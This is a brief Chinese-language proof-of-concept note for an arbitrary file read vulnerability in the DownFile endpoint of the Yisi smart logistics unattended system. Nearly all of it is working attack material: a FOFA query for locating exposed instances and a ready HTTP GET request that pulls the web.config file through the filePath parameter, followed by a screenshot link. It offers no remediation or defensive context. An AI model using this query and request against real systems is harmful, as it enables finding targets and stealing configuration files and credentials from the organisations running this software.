# 易思智能物流无人值守系统DownFile任意文件读取漏洞

易思智能物流无人值守系统DownFile任意文件读取漏洞

## fofa

```javascript
body="/api/SingleLogin"
```

## poc

```javascript
GET /PublicInfoManage/Upload/DownFile?filePath=web.config HTTP/1.0
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
```

![image-20241106172615405](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411061726493.png)